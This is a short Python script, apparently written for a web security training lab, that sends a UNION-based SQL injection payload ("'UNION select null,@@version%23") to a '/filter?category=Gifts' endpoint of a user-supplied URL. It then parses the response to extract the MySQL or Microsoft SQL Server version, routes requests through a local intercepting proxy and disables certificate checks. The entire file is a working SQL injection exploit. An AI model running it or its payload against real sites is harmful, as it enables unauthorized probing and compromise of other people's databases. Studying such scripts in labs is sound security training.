# for mysql and microsoft database

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

path = "/filter?category=Gifts"

def exploit_sqli_version(url):
    sql_payload = "'UNION select null,@@version%23"
    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    if "database" in r.text:
        print("[+] Found the database version...")
        soup = BeautifulSoup(r.text,'html.parser')
        version = soup.find(text = re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))  #check regex on regex101.com and see if it matches with string
        if version is None:
            return False
        else:
            print(f"[+] The database version is: {version}")
            return True


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url>")
        print(f"[*] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("[+] Dumping the database version......")

    if not exploit_sqli_version(url):
        print("[-] Database version not found.")